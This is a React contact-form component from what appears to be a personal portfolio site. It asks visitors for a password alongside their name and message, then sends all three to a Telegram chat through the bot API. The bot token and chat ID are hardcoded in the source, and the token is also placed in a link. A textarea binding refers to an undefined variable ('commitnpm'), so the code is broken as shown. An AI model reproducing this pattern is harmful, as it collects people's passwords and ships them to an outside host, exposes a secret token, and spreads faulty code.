import "./Contact.css"
import img3 from "../assets/img3.png"
import img11 from "../assets/img11.png"
import { useState } from 'react'
import axios from 'axios'
import { ToastContainer,toast } from 'react-toastify'
function  Contact() {

  let [user , setUsers]= useState("")
  let [password , setPassword]=useState("")
  let [commit , setCommit ]= useState("")

  let BOT_TOKEN ="7572608657:AAEudrZXYxNy6DobZbT96AodnR6AtfP4_yo"
  let CHAT_ID ="384624114"

     async function hendlesubmit(e) {
    e.preventDefault()

    let text = `📃yangi habar \n 👨🏻‍💻username ${user} \n 🔑password : ${password} \n ✉commit : ${commit}`;
    if (user && password && commit) {
          try{
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        chat_id : CHAT_ID,
        text: text

      })
      setPassword('')
      setUsers('')
      setCommit('')
      toast.success("malumot yuborildi")
    }catch(err){
      toast.error("malumot yuborilmadi")
    }
    }else(
      toast.warning("malumotni toldiring")
    )

  }
    return(
        <>
        
                <div className="Contact" id="Contact">
            <h1>Contact</h1>
            <div className="Contact-inputs">
                <p>If you have any questions, please do not hesitate to contact me. I am open to any job opportunities that match my skills and interests.</p>
                <form onSubmit={hendlesubmit}>

                <h3>Your Name:</h3>
                <input type="text" placeholder='Enter your name' onChange={(e)=>setUsers(e.target.value)}  value={user}/>
                <h3>Your Password:</h3>
                <input type="password" placeholder='Enter your password' onChange={(e)=>setPassword(e.target.value)}  value={password}/>
                <h3>Your Message:</h3>
                <textarea type="text" placeholder='Enter your massage' onChange={(e)=>setCommit(e.target.value)} value={commitnpm }></textarea> <br />
                <button>Send Message</button>

                </form>
            </div>
            <div className="Contacts">
                <h2>shamsiddin@gmail.com</h2>
                <h2>+998 (90) 694-12-84</h2>
                <h2>Uzb,Namangan</h2>
                <a href="https://github.com/Shamsiddin1233?tab=repositories" target="blank"><img src={img3} alt="" /></a>

                <a href="7572608657:AAEudrZXYxNy6DobZbT96AodnR6AtfP4_yo" target="blank"><img src={img11} alt="" /></a>
            </div>
        </div>
        

            <ToastContainer
        position="top-right"
        autoClose={3000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick={false}
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="dark"
      />
        </>
    )
}
export default Contact